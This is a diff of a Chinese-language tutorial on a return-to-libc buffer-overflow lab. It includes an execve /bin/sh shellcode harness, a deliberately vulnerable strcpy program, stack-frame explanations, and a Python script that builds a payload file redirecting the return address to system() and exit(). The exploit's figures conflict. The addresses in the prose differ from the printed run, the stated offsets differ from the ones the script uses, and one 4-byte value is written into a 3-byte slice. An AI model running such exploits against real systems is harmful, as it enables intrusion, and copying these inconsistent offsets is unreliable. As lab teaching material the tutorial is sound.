@@ -16,8 +16,8 @@ const char code[] =
 	"\x89\xe3\x50\x53\x89\xe1\x99"
 	"\xb0\x0b\xcd\x80";
 
-int main(int argc, char **argv)
-{
+int main(int argc, char **argv) {
+
 	char buffer[sizeof(code)];
 	strcpy(buffer, code);
 	((void(*)( ))buffer)( );
@@ -87,6 +87,7 @@ $
 我们准备的漏洞程序如下所示：
 
 ```c{.line-numbers}
+// 代码清单 2.1
 /* This program has a buffer overflow vulnerability. */
 #include <stdlib.h>
 #include <stdio.h>
@@ -486,5 +487,72 @@ popl  %ebp
 ret
 ```
 
+下图所示为后记的每条指令执行前后栈的情况。这些指令总体上是与函数的 prologue 指令相反的。epilogue 的第一条指令把 %esp 移到帧指针指向的位置，实际上释放了之前为局部变量开辟的栈空间。epilogue 的第二条指令将前帧指针赋值给 %ebp，这用来恢复调用者函数的帧指针。epilogue 的最后一条指令 ret 从栈中弹出返回地址，然后跳转到该地址。IA-32 体系结构处理器有 2 条内设指令：enter 和 leave 指令。**<font color="red">enter 指令执行函数的 prologue，leave 指令执行 epilogue 的前 2 条指令</font>**。
 
+<div align="center">
+    <img src="return_to_libc_static//4.png" width="550"/>
+</div>
+
+### 5.任务 C
+
+代码清单 2.1 中的 **`foo()`** 函数存在缓冲区溢出漏洞，因此可以利用溢出将返回地址修改为 **`system()`** 函数的地址。下图 (a)~(c) 反映了 foo() 函数调用 system() 函数过程中 %esp 寄存器值的变化。
+
+下图 (a) 是执行完 strcpy 实现了缓冲区溢出之后，但是还没有从 foo 函数返回的状态，也就是还没有执行 foo 函数的 epilogue，此时 %ebp 寄存器指向的位置被 0xaa 覆盖；
+
+图（b）是执行完 foo 函数的 epilogue 后的状态，此时 %ebp 寄存器指向的位置并不重要，因为它即将被 %esp 的值所替代；图（c）是执行完 system 函数 prologue 之后的状态，注意一般执行函数 call 指令跳转，%esp 要减少 4 将下一条指令的值保存到栈中，但是这里是从 foo 函数返回，跳转就是 ret 指令直接将返回地址的值写入到 %eip 寄存器中实现跳转，不需要减去 4。接着执行 system 函数的 prologue，使得 %esp 的值减少 4，**并且 %ebp 被设置为 %esp 的值，这就是 %ebp 最终指向的地方。因此 system 函数的参数只需要保存到当前 %ebp+8 的位置即可**。
+
+<div align="center" style="display: flex; justify-content: center">
+    <img src="return_to_libc_static//6.png" width="700"/>
+</div>
+
+需要注意的是，图（c）中 **`%ebp+4`** 的地方应该被视为 **`system()`** 函数的返回地址，如果在这个位置随便存放一个数值，当 **`system()`** 函数返回时 (**`/bin/sh`** 程序结束后才会返回)，程序很可能会崩溃。**<font color="red">更好的办法是将 **`exit()`** 函数的地址放在那里，这样当 **`system()`** 函数返回时，它将跳转到 **`exit()`** 函数，从而完美终止程序</font>**。
+
+### 6.构建恶意输入
+
+为了构建恶意输入，我们需要获取到上图中 1、2、3 个位置距离缓冲区起始位置的偏移量，位置 1 用来保存 **`system()`** 函数的参数，也就是 **`/bin/sh`** 字符串的地址；位置 2 用来保存 **`exit()`** 函数的地址；位置 3 用来保存 **`system()`** 函数的地址。因此，我们可以通过使用 printf 打印代码清单 2.1 中的 **`foo()`** 函数的 %ebp 寄存器的值。foo 函数修改如下：
+
+```c{.line-numbers}
+int foo(char* str) {
+	unsigned long ebp_value;
+    __asm__ volatile ("movl %%ebp, %0" : "=r" (ebp_value));
+
+    char buffer[100];
+    printf("%p %lx\n", buffer, ebp_value);
+    printf("%p %p\n", &system, &exit);
+    /* the following statement has a buffer overflow problem. */
+    strcpy(buffer, str);
+    return 1;
+}
+```
+
+最后运行的结果如下所示，因此 buffer 的起始地址为 0xffffcec8，%ebp 寄存器的值为 0xffffcf38，两者之差为 116。因此位置 1、2、3 的偏移量是 128、124、120。
+
+```c{.line-numbers}
+monica@xvm:~/csapp/chapter3$ ./stack
+0xffffced4 0xffffcf48
+system: 0xf7dc4cd0 exit: 0xf7db71f0
+段错误
+```
+
+接下来获取 32 位的 **`system()`** 函数和 **`exit()`** 函数的地址分别为：0xf7dc4cd0、0xf7db71f0。再次使用 **`gcc envaddr.c -o env22 -m32`** 命令编译运行 envaddr.c 文件中的代码，程序名称为 env22 是因为环境变量的地址会受到程序名称长度的影响，因此需要将其控制和 stack 名称长度保持一致，运行可以得到 /bin/sh 字符串的地址：**`0xffffd3a9`**。因此可以编写如下的 exploit.py 文件，构建恶意代码：
+
+```python{.line-numbers}
+import sys
+
+# 给 content 填上非零值
+content = bytearray(0xaa for i in range(300))
+# /bin/sh 的地址
+a3 = 0xffffd3a9
+content[124:127] = (a3).to_bytes(4, byteorder='little')
+# exit() 函数的地址
+a2 = 0xf7db71f0
+content[120:124] = (a2).to_bytes(4, byteorder='little')
+# system() 函数的地址
+a1 = 0xf7dc4cd0
+content[116:120] = (a1).to_bytes(4, byteorder='little')
+
+file = open("badfile", "wb")
+file.write(content)
+file.close()
+```
 
